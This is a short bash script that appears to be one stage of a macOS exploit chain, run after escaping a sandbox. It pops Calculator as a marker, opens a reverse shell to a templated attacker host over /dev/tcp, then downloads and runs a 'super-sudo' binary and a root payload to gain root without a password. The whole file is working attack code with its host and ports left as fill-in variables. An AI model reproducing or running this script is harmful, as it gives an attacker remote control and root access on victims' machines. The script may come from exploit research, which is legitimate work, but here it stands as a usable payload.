#!/bin/bash

echo Executing outside of the sandbox \\o/

# Open a calculator
open /Applications/Calculator.app

# Establish a reverse shell
bash -c "/bin/bash > /dev/tcp/{{ host }}/{{ revshell_port }} <&1 2>&1" &

cd /tmp

# Do the privesc to root (stage4)
curl -s http://{{ host }}:{{ http_port }}/ssudo > ./ssudo
curl -s http://{{ host }}:{{ http_port }}/root_payload.sh > ./root_payload.sh
chmod +x ssudo root_payload.sh
echo "Installed super-sudo (no password required anymore)"

./ssudo ./root_payload.sh

echo We are done here...
